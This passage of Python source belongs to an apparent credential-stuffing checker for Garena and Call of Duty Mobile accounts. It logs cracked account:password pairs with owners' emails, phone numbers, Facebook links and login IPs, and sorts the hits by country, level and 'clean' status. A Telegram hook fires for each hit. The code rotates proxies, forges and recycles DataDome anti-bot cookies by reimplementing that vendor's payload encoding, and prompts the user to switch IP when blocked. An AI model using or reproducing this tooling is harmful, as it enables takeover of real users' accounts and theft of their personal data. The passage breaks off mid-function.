                new_entry = new_entry[len('-' * 60):].strip()
            if new_entry.endswith('-' * 60):
                new_entry = new_entry[:-len('-' * 60)].strip()
            entries.append(new_entry)
            if sort_by == 'shell':
                entries.sort(key=self._entry_shell, reverse=True)
            else:
                entries.sort(key=self._entry_level, reverse=True)
            with open(filepath, 'w', encoding='utf-8', errors='replace') as f:
                for i, entry in enumerate(entries):
                    f.write('-' * 60 + '\n')
                    f.write(entry.strip())
                    f.write('\n' + '-' * 60)
                    if i < len(entries) - 1:
                        f.write('\n\n')
    def _append_line(self, filepath, line):
        filepath = str(filepath)
        with self._get_flock(filepath):
            with open(filepath, 'a', encoding='utf-8', errors='replace') as f:
                f.write(line + '\n')
    @staticmethod
    def _ascii(val):
        if not val or val == 'N/A':
            return val
        cleaned = ''.join((c for c in str(val) if c >= ' ' or c in '\t')).strip()
        return cleaned or 'N/A'
    def _format_server(self, region_code):
        if not region_code or region_code == 'N/A':
            return 'N/A'
        _region_info = CODM_REGIONS.get(str(region_code).upper(), {}) if region_code and region_code != 'N/A' else {}
        return f"{_region_info['flag']} {_region_info['name']} ({region_code})" if _region_info else str(region_code)
    def _format_account(self, account_data, index=1):
        acct = account_data.get('account', 'N/A')
        pwd = account_data.get('password', 'N/A')
        if account_data.get('is_error'):
            return '-' * 60 + f"\nAccount: {acct} : {pwd}\nError: {account_data.get('error_reason', 'Unknown')}\n" + '-' * 60
        is_clean = account_data.get('is_clean', False)
        has_codm = account_data.get('has_codm', False)
        base_lines = [
            '-' * 60, f'Account: {acct} : {pwd}', f'UID: {account_data.get("uid", "N/A")}',
            f'Username: {self._ascii(account_data.get("username", "N/A"))}',
            f'Garena Shell: {account_data.get("shell_balance", 0)}',
            f'Email: {account_data.get("email_display", "N/A")}',
            f'Mobile: {account_data.get("formatted_mobile", "N/A")}',
            f'Country: {account_data.get("country", "N/A")}',
            f'Nickname: {self._ascii(account_data.get("nickname", "N/A"))}',
            '', '--- Facebook Information ---',
            f'Facebook Username: {self._ascii(account_data.get("fb_username", "N/A"))}',
            f'Facebook Link: {account_data.get("fb_link", "N/A")}',
            f'Facebook Status: {account_data.get("fb_info", "N/A")}',
            '', '--- Login History ---',
            f'Last Login: {account_data.get("last_login_date", "N/A")}',
            f'Last Login From: {account_data.get("last_login_where", "N/A")}',
            f'Last Login IP: {account_data.get("last_login_ip", "N/A")}',
            f'Last Login Country: {account_data.get("last_login_country", "N/A")}',
            '', f'Account Status: {("Clean" if is_clean else "Not Clean")}',
            '', '✦  Powered by: @mitzgaspari  ✦', '-' * 60
        ]
        if not has_codm:
            return '\n'.join(base_lines)
        codm_lines = [
            '--- CODM Information ---',
            f'Account Level: {account_data.get("codm_level", "N/A")}',
            f'Server: {self._format_server(account_data.get("codm_region", "N/A"))}',
            f'IGN: {self._ascii(account_data.get("codm_nickname", "N/A"))}',
            f'UID: {account_data.get("codm_uid", account_data.get("uid", "N/A"))}', ''
        ]
        login_index = base_lines.index('--- Login History ---')
        final_lines = base_lines[:login_index] + codm_lines + base_lines[login_index:]
        return '\n'.join(final_lines)
    def add_account(self, account_data):
        hook = self._tg_hook if self._tg_hook is not None else _TG_HOOK
        if hook and (not account_data.get('is_error')):
            threading.Thread(target=hook, args=(account_data,), daemon=True).start()
        if account_data.get('is_error'):
            return
        combo = f"{account_data.get('account', '')}:{account_data.get('password', '')}"
        entry = self._format_account(account_data, index=self._next_index())
        has_codm = account_data.get('has_codm', False)
        is_clean = account_data.get('is_clean', False)
        shell = int(account_data.get('shell_balance', 0) or 0)
        timestamp = self.timestamp
        self._write_sorted(self.base_dir / f'All_Accounts_{timestamp}.txt', entry)
        self._append_line(self.base_dir / f'Valid_Accounts_{timestamp}.txt', combo)
        if is_clean and has_codm:
            self._write_sorted(self.base_dir / f'Clean_Accounts_{timestamp}.txt', entry)
        elif has_codm:
            self._write_sorted(self.base_dir / f'Not_Clean_Accounts_{timestamp}.txt', entry)
        if not has_codm:
            self._write_sorted(self.base_dir / f'NO_CODM_Accounts_{timestamp}.txt', entry)
            if shell > 0:
                self._write_sorted(self.base_dir / 'Garena Shells' / f'NO_CODM_Shells_{timestamp}.txt', entry, sort_by='shell')
            return
        country = str(account_data.get('country', 'XX') or 'XX').strip().upper()
        self._write_sorted(self.base_dir / 'Country' / f'{country}_Accounts_{timestamp}.txt', entry)
        try:
            lvl = int(account_data.get('codm_level', 0) or 0)
        except (ValueError, TypeError):
            lvl = 0
        bucket = '1-100_{timestamp}.txt' if lvl <= 100 else '101-200_{timestamp}.txt' if lvl <= 200 else '201-350_{timestamp}.txt' if lvl <= 350 else '351-400_{timestamp}.txt'
        self._write_sorted(self.base_dir / 'Level' / bucket, entry)
        if shell > 0:
            self._write_sorted(self.base_dir / 'Garena Shells' / f'CODM_Shells_{timestamp}.txt', entry, sort_by='shell')

_SCRIPT_DIR_COOKIE = os.path.dirname(os.path.abspath(__file__))
_TG_HOOK = None

class ProxyManager:
    def __init__(self, enabled=True, fallback_url=None, proxy_file="proxies.txt"):
        self.enabled = enabled
        self.proxies = []
        self._index = 0
        self._counter = 0
        self._lock = threading.Lock()
        if not enabled:
            return
        if fallback_url:
            self.proxies = [fallback_url]
        elif proxy_file and Path(proxy_file).exists():
            self._load_from_file(proxy_file)
    def _load_from_file(self, proxy_file):
        with open(proxy_file, 'r', encoding='utf-8', errors='ignore') as f:
            for line in f:
                url = _parse_proxy_line(line)
                if url:
                    self.proxies.append(url)
    def get_next(self):
        if not self.enabled or not self.proxies:
            return None
        with self._lock:
            proxy = self.proxies[self._index % len(self.proxies)]
            self._index += 1
            self._counter += 1
        return {'http': proxy, 'https': proxy}
    def is_loaded(self):
        return self.enabled and len(self.proxies) > 0
    def get_count(self):
        return len(self.proxies)

class CookieManager:
    def __init__(self):
        self.banned_cookies = set()
        self.live_cookies = deque()
        self.lock = threading.Lock()
        self.load_banned_cookies()
        self.load_initial_cookies()
    def load_banned_cookies(self):
        if os.path.exists('banned_cookies.txt'):
            with open('banned_cookies.txt', 'r') as f:
                self.banned_cookies = set((line.strip() for line in f if line.strip()))
    def load_initial_cookies(self):
        if os.path.exists('fresh_cookie.txt'):
            with open('fresh_cookie.txt', 'r') as f:
                for line in f:
                    cookie = line.strip()
                    if cookie and cookie not in self.banned_cookies:
                        self.live_cookies.append(cookie)
    def is_banned(self, cookie):
        return cookie in self.banned_cookies
    def mark_banned(self, cookie_value):
        formatted_cookie = cookie_value if 'datadome=' in cookie_value else f'datadome={cookie_value}'
        with self.lock:
            if formatted_cookie in self.live_cookies:
                self.live_cookies.remove(formatted_cookie)
            if formatted_cookie not in self.banned_cookies:
                self.banned_cookies.add(formatted_cookie)
                threading.Thread(target=self._append_to_file, args=('banned_cookies.txt', formatted_cookie), daemon=True).start()
    def get_valid_cookies(self):
        with self.lock:
            cookies = list(self.live_cookies)
            if cookies:
                random.shuffle(cookies)
            return cookies
    def save_cookie(self, datadome_value):
        if not datadome_value:
            return False
        val = datadome_value.strip()
        formatted_cookie = val if val.startswith('datadome=') else f'datadome={val}'
        with self.lock:
            if formatted_cookie not in self.banned_cookies and formatted_cookie not in self.live_cookies:
                self.live_cookies.append(formatted_cookie)
                threading.Thread(target=self._append_to_file, args=('fresh_cookie.txt', formatted_cookie), daemon=True).start()
                return True
        return False
    def _append_to_file(self, filename, content):
        try:
            with open(filename, 'a') as f:
                f.write(content + '\n')
        except Exception:
            pass

def encode(plaintext, key):
    key = bytes.fromhex(key)
    plaintext = bytes.fromhex(plaintext)
    cipher = AES.new(key, AES.MODE_ECB)
    ciphertext = cipher.encrypt(plaintext)
    return ciphertext.hex()[:32]

def get_passmd5(password):
    decoded_password = urllib.parse.unquote(password)
    return hashlib.md5(decoded_password.encode('utf-8')).hexdigest()

def hash_password(password, v1, v2):
    passmd5 = get_passmd5(password)
    inner_hash = hashlib.sha256((passmd5 + v1).encode()).hexdigest()
    outer_hash = hashlib.sha256((inner_hash + v2).encode()).hexdigest()
    return encode(passmd5, outer_hash)

def applyck(session, cookie_str):
    session.cookies.clear()
    cookie_dict = {}
    for item in cookie_str.split(';'):
        item = item.strip()
        if not item:
            continue
        if '=' in item:
            try:
                key, value = item.split('=', 1)
                cookie_dict[key.strip()] = value.strip()
            except ValueError:
                pass
    session.cookies.update(cookie_dict)

_ip_wait_lock = threading.Lock()
_ip_wait_active = False
_ip_wait_event = threading.Event()
_suppress_ip_prints = False
_ip_block_callback = None

def init_ga_cookies(session):
    timestamp = int(time.time())
    random_id = random.randint(1000000000, 9999999999)
    ga_cookies = {'_ga': f'GA1.1.{random_id}.{timestamp}', '_ga_XB5PSHEQB4': f'GS2.1.s{timestamp}$o1$g0$t{timestamp}$j53$l0$h0', '_ga_1M7M9L6VPX': f'GS2.1.s{timestamp}$o6$g0$t{timestamp}$j60$l0$h0'}
    for name, value in ga_cookies.items():
        session.cookies.set(name, value, domain='.garena.com')
    return ga_cookies

class DataDomeGenerator:
    def init(self, key: str, cookie: str):
        self.key = key
        self.cookie = cookie
        self.t = 9959949970
        self.n = 1789537805
    def _hash_str_to_int(self, s: str) -> int:
        if not s:
            return self.n
        o = 0
        for char in s:
            o = (o << 5) - o + ord(char) & 4294967295
        return o
    def _prng_h(self, n: int) -> int:
        n ^= n << 13
        n ^= n >> 17 & 4294967295
        n ^= n << 5
        return n & 4294967295
    def _create_keystream_generator(self, seed1: int, seed2: int):
        e = seed1
        i = -1
        r = seed2
        a = True
        u = None
        def generator(get_val: bool=False) -> int:
            nonlocal e, i, r, a, u
            if u is not None:
                t = u
                u = None
                return t
            i += 1
            if i > 2:
                e = self._prng_h(e)
                i = 0
            t = e >> 16 - 8 * i & 255
            if a:
                r -= 1
                t ^= r & 255
            if get_val:
                u = t
            return t
        a = False
        return generator
    def _custom_b64_encode_char(self, n: int) -> int:
        if 37 < n:
            return 59 + n
        if 11 < n:
            return 53 + n
        if 1 < n:
            return 46 + n
        return 50 * n + 45
    def generate_payload(self, data: dict[str, any], timestamp: int) -> str:
        seed_from_cookie = self._hash_str_to_int(self.cookie)
        initial_seed = self.t ^ seed_from_cookie ^ self._hash_str_to_int(self.key)
        e = self._prng_h(self._prng_h((timestamp >> 3 ^ 11027890091) * self.t))
        keystream_gen_a = self._create_keystream_generator(initial_seed, e)
        payload_bytes = []
        is_first = True
        def stringify(val: Any) -> str:
            return json.dumps(val)
        def encrypt_str(s: str) -> List[int]:
            buffer = s.encode('utf-8')
            encrypted = []
            for byte in buffer:
                encrypted.append(byte ^ keystream_gen_a())
            return encrypted
        for key, value in data.items():
            if not is_first:
                payload_bytes.append(keystream_gen_a() ^ 44)
            key_bytes = encrypt_str(stringify(key))
            value_bytes = encrypt_str(stringify(value))
            payload_bytes.extend(key_bytes)
            payload_bytes.append(keystream_gen_a() ^ 58)
            payload_bytes.extend(value_bytes)
            is_first = False
        keystream_gen_b = self._create_keystream_generator(1809053797 ^ self._hash_str_to_int(self.cookie), e)
        final_bytes = [byte ^ keystream_gen_b() for byte in payload_bytes]
        final_bytes.append(keystream_gen_a(True) ^ 125 ^ keystream_gen_b())
        result_chars = []
        w = 0
        b = e
        while w < len(final_bytes):
            b = b - 1 & 4294967295
            byte1 = b & 255 ^ final_bytes[w]
            w += 1
            b = b - 1 & 4294967295
            byte2 = b & 255 ^ final_bytes[w] if w < len(final_bytes) else 0
            w += 1
            b = b - 1 & 4294967295
            byte3 = b & 255 ^ final_bytes[w] if w < len(final_bytes) else 0
            w += 1
            z = byte1 << 16 | byte2 << 8 | byte3
            result_chars.append(chr(self._custom_b64_encode_char(z >> 18 & 63)))
            result_chars.append(chr(self._custom_b64_encode_char(z >> 12 & 63)))
            result_chars.append(chr(self._custom_b64_encode_char(z >> 6 & 63)))
            result_chars.append(chr(self._custom_b64_encode_char(z & 63)))
        padding = len(final_bytes) % 3
        if padding > 0:
            return ''.join(result_chars[:-(3 - padding)])
        return ''.join(result_chars)

class DataDomeManager:
    def __init__(self):
        self.current_datadome = None
        self.datadome_history = []
        self._403_attempts = 0
    def set_datadome(self, datadome_cookie):
        if datadome_cookie and datadome_cookie != self.current_datadome:
            self.current_datadome = datadome_cookie
            self.datadome_history.append(datadome_cookie)
            if len(self.datadome_history) > 10:
                self.datadome_history.pop(0)
    def get_datadome(self):
        return self.current_datadome
    def extract_datadome_from_session(self, session):
        try:
            cookies_dict = session.cookies.get_dict()
            datadome_cookie = cookies_dict.get('datadome')
            if datadome_cookie:
                self.set_datadome(datadome_cookie)
                return datadome_cookie
            return None
        except Exception:
            return None
    def clear_session_datadome(self, session):
        try:
            if 'datadome' in session.cookies:
                del session.cookies['datadome']
        except Exception:
            pass
    def set_session_datadome(self, session, datadome_cookie=None):
        try:
            self.clear_session_datadome(session)
            cookie_to_use = datadome_cookie or self.current_datadome
            if cookie_to_use:
                session.cookies.set('datadome', cookie_to_use, domain='.garena.com')
                return True
            return False
        except Exception:
            return False
    def get_current_ip(self):
        ip_services = ['https://api.ipify.org', 'https://icanhazip.com', 'https://ident.me', 'https://checkip.amazonaws.com']
        for service in ip_services:
            try:
                response = requests.get(service, timeout=8)
                if response.status_code == 200:
                    ip = response.text.strip()
                    if ip and '.' in ip:
                        return ip
            except Exception:
                continue
        return None
    def wait_for_ip_change(self, session, check_interval=1, max_wait_time=200, stop_event=None):
        global _ip_wait_lock, _ip_wait_active, _ip_wait_event
        with _ip_wait_lock:
            if _ip_wait_active:
                is_primary = False
            else:
                _ip_wait_active = True
                _ip_wait_event.clear()
                is_primary = True
        if not is_primary:
            _ip_wait_event.wait(timeout=max_wait_time + 30)
            return True
        try:
            original_ip = self.get_current_ip()
            if not original_ip:
                if not _suppress_ip_prints:
                    _log('WARNING', 'IP BLOCKED — could not detect IP, waiting 10s')
                if _ip_block_callback:
                    _ip_block_callback(True)
                time.sleep(10)
                if _ip_block_callback:
                    _ip_block_callback(False)
                return True
            if not _suppress_ip_prints:
                _log('ERROR', f'IP BLOCKED — [bold]{original_ip}[/bold]')
                _log('WARNING', 'Change your IP now — VPN / Mobile Data / Airplane Mode')
            if _ip_block_callback:
                _ip_block_callback(True)
            start_time = time.time()
            if not _suppress_ip_prints:
                with Progress(SpinnerColumn(), TextColumn('[progress.description]{task.description}'), BarColumn(), TimeElapsedColumn(), console=Console(), transient=True) as progress:
                    task = progress.add_task('[yellow]Waiting for IP change…', total=max_wait_time)
                    while time.time() - start_time < max_wait_time:
                        if stop_event and stop_event.is_set():
                            _log('INFO', 'IP wait aborted by stop_event')
                            if _ip_block_callback:
                                _ip_block_callback(False)
                            return False
                        time.sleep(check_interval)
                        progress.update(task, completed=time.time() - start_time)
                        current_ip = self.get_current_ip()
                        if current_ip and current_ip != original_ip:
                            _log('SUCCESS', f'IP changed: [dim]{original_ip}[/dim] → [bold bright_green]{current_ip}[/bold bright_green]')
                            if _ip_block_callback:
                                _ip_block_callback(False)
                            return True
                _log('ERROR', 'IP did not change within time limit')
                if _ip_block_callback:
                    _ip_block_callback(False)
                return False
            else:
                while time.time() - start_time < max_wait_time:
                    if stop_event and stop_event.is_set():
                        _log('INFO', 'IP wait aborted by stop_event')
                        if _ip_block_callback:
                            _ip_block_callback(False)
                        return False
                    time.sleep(check_interval)
                    current_ip = self.get_current_ip()
                    if current_ip and current_ip != original_ip:
                        if _ip_block_callback:
                            _ip_block_callback(False)
                        return True
                if _ip_block_callback:
                    _ip_block_callback(False)
                return False
        finally:
            with _ip_wait_lock:
                _ip_wait_active = False
            _ip_wait_event.set()
    def handle_403(self, session, stop_event=None):
        self._403_attempts += 1
        if self._403_attempts >= 3:
            if self.wait_for_ip_change(session, stop_event=stop_event):
                self._403_attempts = 0
                new_datadome = get_datadome_cookie(session)
                if new_datadome:
                    self.set_datadome(new_datadome)
                    self.set_session_datadome(session, new_datadome)
                return True
            else:
                return False
        return False

def get_datadome_cookie(session, proxies=None):
    url = 'https://datadome.garena.com/js/'
    timestamp = int(time.time())
    random_id = random.randint(1000000000, 9999999999)
    headers = {
        'content-length': '6374',
        'sec-ch-ua': '"Chromium";v="137", "Not/A)Brand";v="24"',
        'sec-ch-ua-platform': '"Android"',
        'sec-ch-ua-mobile': '?1',
        'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36',
        'content-type': 'application/x-www-form-urlencoded;charset=UTF-8',
        'accept': '*/*',
        'origin': 'https://sso.garena.com',
        'sec-fetch-site': 'same-site',
        'sec-fetch-mode': 'no-cors',
        'sec-fetch-dest': 'empty',
        'referer': 'https://sso.garena.com/',
        'accept-encoding': 'gzip, deflate, br',
        'accept-language': 'en-PH,en-US;q=0.9,en;q=0.8',
        'cookie': f'_ga_1M7M9L6VPX=GS2.1.s{timestamp}$o21$g1$t{timestamp}$j53$l0$h0; _ga=GA1.1.{random_id}.{timestamp}'
    }
    payload = {
        'jspl': 'QGQ0BVgjckhG9XFf_olrvPEwB5AKErtjUd6f_dtbCw6uU4mUnl4Ca5uJY9K_OWQfTtT2EcX852pDG2IId4gG5U65OppS7iwx7RfQ1zzKRMro56Xwcuu9Q_K16c69frRlWlLQd-n0p6XgiRXwusJv0AzdM9tBXrKAChlwUPvgd1086UwD5VEdfQXn-_xJN7-6-7Fs2LBt0A7vW4CPF6iCHCIKFJHbFFo8uTxvSdJL69AHKqqrRJ8oQCkfO_GrZiTFCXZAbGwdCqzkFEGFeBGH0RVAG_q7wmiKlII3zlcqZcRgoP2awfU6RjhvIeJToH5rTrby8SGuCZXLAGCG2tcCxraVYDQEL63p5anIGBrdTwdGVE6yL8B4vXNXLTIO0iq0AWjCksq599tQ38RAgo0tMl6cix0pOUwpigTNKY-4eIEEaQ2Cn_Nr9eXTrqRWZOaszlStMIE8M73ErsI_6dLXI5tcohL1NA0k6dPyVhurkMtYjUodgDN0EluJufLMKvH_D6-JT9xIebqCZ2zPv2eOO5wcMC1TyHFjR3NGwpJvD-YghfQUxdmFd3Xcjc41Rcp21CZ2HVsFZME-B8ppZ7AyU3Mn-ETydYWauETEamzkZynKSMKQTys-SrbONsKCbmQiGUxDumBKsPR8ODY87U_QKs3icJeXPheiBv-0w40kMiBU7KLYOrH0wCcGPO4pWS5bl9ju2KF3nMwD5V5AajCqdotm-JU7qAZxJiPAtU9xZmqr-mDQELX56jokfmqkX8v_4YZeAdx0VU96Rpj_-qdvhKpzm9OYZeJI-4VVLhXN200cEumhRfyVp5HZ3pUdUYxgp0ryCydj31kG8dLTDCKTIhMtsUo3bSypcbsE-xdz-P-gUNUYXcTN7uuekhuKwNIeEcTcLdw6udGartLTkTt4SmWxncPDzKwLh6qdhdRVAJIhlbeFY_OeIF4TkCPbGEv9xlN3MJFZccX097QLDT9niyMzxACRar3aPJDzZlaoyyr0asFkNu65-Hfj_XLYlSYET7vC-Sqgzo5016flXcuzKZvMfJp9Jk78GRUtYtVPHEJzMdU0SMcKTp8joR8Y_mmyHIOnoGer4TatyOfNCRF8XOJNdMwp3qSknYp_yfBSUa1Ij3WPtX9lg5kl50YJgNQPovYyCJU_Dwjty_KirEFgbUoOT7yr7w5pJc7yBC2n3wfTxiwmp-RsBwZXlk19UYDiGwWTMA5EfglURLVraue7Df36AEQV5QqBVupNtGpZFwPC5K9YJDG5DIlIMNfIL4X8chGhxCMV6nem-otHDi9JUkcVbTttqrJyXQ50FNfRwUt_ScqwsXVEBD26I-AD6xsdkqmCx60ehJMXiSywNE_Mjt9zG4TUoHKY95gpcXDSvcSVJ6W-rCAQ3M0vcgu5wcdEb1SXmBzUJf_rSJxZoFNPdZjgrQqVBByJKy2V7x4ywPpPPf83z0Y6B7gkW6RS7fUlT47SSjvtkXGYoRLn9zDcOtvX1TxxUXrDjw4H9T5n7zOy5Eao7BQ9fcDgZ1pyYH6soR9Ug2MsOX5cHCH5LMC7qZtDW0aFKLD76LNMcZfWxn_tiadU3JynnXwkZ8B70leGLWoe9azUJY0F_xgD6tgCKf1xxJQAtcuUU1PTHG_kIFhD_UrZiq4DKhIMZgvkSgwEvpYmHOnpRZMoqOn2T81bwz1jhDq3H0YJClW2y0Bzk_cvMEZOb05kS3cHr0fcVGnLkqxGWWsT9YVRbNueDhbZIoPfdiOpqn9ZTOpxKFxwEuEeKaPSfb6A7PUAHREieN9hpCdlmZwygPw3sHpK0jdD-hKUTiG3d-xOr2Tc9-QVtSy_mdR_rSdMDvXEJsVZJ33f6SaKsnsElaLd2vB8YZfUaTksujLUBqgxd4gSKUdcEZ-_-8huvk9MJFsw37KqHYVCCmdHzJe_KjC6GZx4UGskD1amFPKYTp7Q4H9U-RIflTDX3K8Pxced7Kx4W-7tDt8V5wj6ggRDK_wAZ_8fxpjrH7PhEyTTeJxB_bJ2Sigbjoi368mAoudRMkiChN66D8xap_nYUCtBkdFDZpThAv04leKOllua60DS5W1KL91x9CYMPmKQUWMHFVY6MqPaUsecHxDK1WujPkCnSGKpr0iiEHNpbC_5atdvXmS2dVjyih1fXxpnwW5-uyybBQKkhWXcI6HXC5ic6J4sBra17lvvBfff4sAw_FohvjPwNUCW4fUKz8qrLXYWuhTtsgzCdwXKnNbAJHFg5RPiAR3sDj6eIPJlRSv3foRh656t3015JAetowe7J2l7a_UBRmkQmZerVBEh8LCgU_BqE1Kz4ibHWHBPcBSRZVzCmfUXVUWWaYfAtBUIkz4n0TNDf3MjhksOpda2sKiJ97w7lZDPA_46hiFhfM6SP8y9GV7ToaXGxY-rsDGKxUXvCmk73l5YbxfaHfGhMpKxsSCaj40MFKyCNydU7Wn9Eha1bNW0CdenKkrTcJgpfgHkOKSjIFJMJzElcE1TWTYWxlqJqKHnMw9GmQFPe0JiYSf_NWtU2AFv7cjqCeYU6EOWN6yNMPCpIKHapVzCpwSxVmdywJYwFpte2kcu0RDICFHL1_ocSPF83azDEAcyb2sK6hu5WBR9mB-KGKnBzkktfo7TSvrq05d6jQInG3jxnFULmdvyUhIf7Wh9PoO48psknM85XQ3gCMMUlqyBw0TcsGaik-DLyFnoWo2bQW9vpPhmxO_wtQ6YBfQpIRsJlDexBaLWFX7KpWOr4wgX-0jviPLsXOGSWUQ-e6PxflfbEOB6hYdBL7uJhRO7QA8wsLvnUUxdLY7mxqzCJF2_l_O2a_Sdw7MId_KjEerVYj0VHm9svX7RdrrnS2DzbXyXzRGOy8l6OzQoDUAQRfyV2mjZgpYPxQry2G3P538x4zw-k_JNsy39rhjM0-uCTQ1d7YapQx3W20R3CxSPgk4tiu7sIKQxs-QpnHTKetaGW4MJEreDRZ_h8_oukyvaFPpItE9Yc8SIt1T-2RkAnDNXBA-g287V6lo6v_nNh7mGYC3Lx4qeG26aAsR3oX9SiSCuAp8Lyahw4Q2yPo4NTvsxLuY_b7SzMybfyQVXOCzHRx9VrQXWrTQ3iFvC1o49YQdta8tG1SA15bvhD5IpVcHi6HduW7SEll7Uk1l6hvg8GwwkDSsAqXa7Rsu7g5GL_hI-GaAP1R7VK3iD_TXLAnRoETWh56dMqw4l_QqKCggCA-WSj3WKIXcDnuTtnZragribanEi7_F_DL2q0OHuD1KqzY7c8eouznfNmOHASe_GwrcIVMr-XT1Rf5huXlnQ1l8eqgqQR1oQkc_K3ihzMJM8L_Vhd0_KLR4-1ICSL1QdOSboLjH2nVuzc7je6FyRyNOUBSZU1sT5caMBnNllX4FRwduqGSje9X6XY8a5vYd5Kpgp3AyrPv8gVLExQguIGFa-4IbLmjsM1B6UEj4VTcFM8RJ221_n3KuVDl5X-_g2rW3GHP8zUPlkYOmlJ5Z0GQ8ubDGe14nAAA9H-Rop4TaNFkMup3EOr3Ec6_GvPxzET3lcdP9qF6FdYmY9Ejhr18yGFZfDf3w3y_K7PRfRkEsdliiCSvYosgssIs8jB2VzL3HEbwwjCz_aKZT0W9NYkBxAi8cZf676phGbEJ50hoYRSIwJJU8Tu0A0hrUnkvw3Woc-88SWO4ZlpAxUZXiuFtfhQxbO1SXxByBTaWdJ9GkxriyF0zg8TQeOoZFi5ad-FLPfriP1DitrrITsJKPN-hpORrNd0yjGf9D_-9vD4Mvm8IzkEbzNpX4VHVhrwFLlpk6aeME9q01T-CX5PqmkoVk4cZihcoQe-i96Mcy-umgshZdAyxckIjGFv_vWQYxghUwNTMOotHXbx58RJQQ8QY2FoSyVbTpUXM7yL8_xLT5mh4N_qx66Gpw0t7mSUDSIB992q3vugspQWO2UKy1j5gw8UzlmgYvNTOcR5pRav6Zp-we0685y8IdrKbwH0dm6ZnSSmAlw0WD-YveLDEWJgcFYE94fkZ83czXgJb7I-JrLiyHk7K7aSmXkII-60Fm1ksQayHbJsvnzmXzbaWtp2tgCmM1hqahSnXN_eaUTaDumK9-e-iobjOXcYPERFwssEA_zrRvXFdoiINmqtwVi4so7quVBEMsjyOPsN4WjfgJo39il-yBMVlpBYMxZjZrzoxBU6RaNq3Vn2xz9PTIUnpqFm1V2wAdH-gJNvravSZxWRd8e2ub5SMBJEddGHZMmY2oaxlI1XgsNg9FLFm78WqOP3oqvjpoNPAUeKu6IbDRtuwKEZEQjBCYrih9zELsUYUD2vDr9r4JxSY2_SRx1Istk-z6cm6blTyybiBsrT3t-uULM4VHKBQGcOKF10aeZJkvclKSxI-kUIu97evHkFKcXG6mWRGXt0rzkPCzm12Dm6dLdkS1p4nQGGmlxNf913DXotB7EsBc62ddIO7O1KJTWRCIxBnFmVl2smSMkZ34xaqLcoM17k9zqA8RMYUpUjfnIjhCQCNtRpdJvVsyFVLujlhgBnkNg5ev27PYGgHzEQHeDsNOAMJOf-lzxKn8stzPJp0OjpCNsWcYW6NhbgwnS4y4zzsjGNWSSO8MFpeG-5v2B2ASKsex0TGFmRSsZIP6N_2nJP28QWQEDWL08qKJ1TyrR7P-XbpOm8UmHb2beK56hMHafXmISVakfP0dS3Oh224nYa6QMn8yYiNgvzDKik4bHHiIftnLcCaRZC8FIiioBnj69Ya0tWe0aXwgkNDiTj8ko60jsSFA6x0Y9uAQupjTGjAXkIUGRbfSa-h3qYe4dPiDb0OwpUM7beqkblKvbqNBqy8So5F8MPNaDAS7L0syTp2ugVvp0iwZCAB-4xWJqyToyzNJVrGU9K8jlX7qbh7d7NwqohBq1UT_wEjl2C4Vk1domhlfZeaUPfpMAwTMSLlogvpqsr5dcygjtcH2RL0xvorT9RItWdExi0ZEgZYR2e16sctZHqJdmHDLrcgfxHXV9XpX3I0M20fJe2yV1w5m_Kl5EDs72f8JcrKNvTgCGRa1Jmxu_3yXcWJ1hQSBFauGi6dXnBFk87FUjIewCpy6744anPrNjdBW9zZPAUN4t2E3ehNZKxRddzl9sGlUYR6xkDaKXCthj1sAwjuLfwrYaynulYXCzH9BymnYqWrBGEKQ6SP5OR7uxPfQVRnDPFqXP1kfZlwTNPcDGXUb-EWVxR9w7H6QVPTROp9nkdf_SSQ3u88x1gnD_SVwfwsIh9NXt1L-JidK1DEV2I72FcTxVH4sM4Ch8q8i6x1_Soo6CGnXNKFGUZE2xg8jo2G8O_pwSbOTULG5dXtt_4nFyCWsRhDeFBn7bvguKg0sl4cBHkD_Li8rN-3H8hFw137Q3N2v39DEXGfJEB0et2PX-4r1gVA7qqUHUcNwdvy6ZOcRQg_NYvGgcGWoQde5eAHIQ0avvSQGUHFEUb6NuiiOcKoDXipJtsbNi2UR3pIhfr8YsFQTqdz3NF2zo9IEvY0uds1VowMJAIBF001MlYmMQ3iAVutCrJnMehTpDFZztqzUJ917m72Snc2NA2LSPObaq5M6wiPpLnscG1yCJlVo52xazMfcn3jeRg-RoOAK-mHBSQ-W7oD',
        'eventCounters': '{"mousemove":4,"pointermove":1,"click":4,"scroll":0,"touchstart":4,"touchend":4,"touchmove":0,"keydown":2,"keyup":2}',
        'jsType': 'le',
        'cid': 'ROxC_oAlhyCRnDuIxNT_gKAsk8IOlYBFcrRuxfab_kt77Rrbyhu8xH21Zm6rN1hshR8R1vYl6Mlq8rC8fFRV7M9NV8EwyGm_EF0dY2yiLhcSRRttpELcrtVbTtmEMGG2',
        'ddk': 'AE3F04AD3F0D3A462481A337485081',
        'Referer': 'https%3A%2F%2Fsso.garena.com%2Funiversal%2Flogin%3Fapp_id%3D10100%26redirect_uri%3Dhttps%253A%252F%252Faccount.garena.com%252F%26locale%3Den-PH',
        'request': '%2Funiversal%2Flogin%3Fapp_id%3D10100%26redirect_uri%3Dhttps%253A%252F%252Faccount.garena.com%252F%26locale%3Den-PH',
        'responsePage': 'origin',
        'ddv': '5.8.0'
    }
    data = '&'.join((f'{k}={urllib.parse.quote(str(v))}' for k, v in payload.items()))
    try:
        response = session.post(url, headers=headers, data=data, proxies=proxies, timeout=30)
        response.raise_for_status()
        response_json = response.json()
        if response_json.get('status') == 200 and 'cookie' in response_json:
            cookie_string = response_json['cookie']
            if '=' in cookie_string and ';' in cookie_string:
                datadome = cookie_string.split(';')[0].split('=')[1]
            else:
                datadome = cookie_string
            return datadome
    except Exception:
        pass
    return None

def prelogin(session, account, datadome_manager, cookie_manager, retries=3, proxy_manager=None, stop_event=None):
    all_403 = True
    for attempt in range(retries):
        if stop_event and stop_event.is_set():
            return (None, None, None)
        try:
            url = 'https://sso.garena.com/api/prelogin'
            params = {'app_id': '10100', 'account': account, 'format': 'json', 'id': str(int(time.time() * 1000))}
            current_cookies = session.cookies.get_dict()
            cookie_parts = []
            for cookie_name in ['apple_state_key', 'datadome', 'sso_key', '_ga', '_ga_XB5PSHEQB4', '_ga_1M7M9L6VPX']:
                if cookie_name in current_cookies:
                    cookie_parts.append(f'{cookie_name}={current_cookies[cookie_name]}')
            cookie_header = '; '.join(cookie_parts) if cookie_parts else ''
            headers = {
                'Host': 'sso.garena.com',
                'Connection': 'keep-alive',
                'sec-ch-ua': '"Chromium";v="137", "Not/A)Brand";v="24"',
                'Accept': 'application/json, text/plain, */*',
                'sec-ch-ua-mobile': '?1',
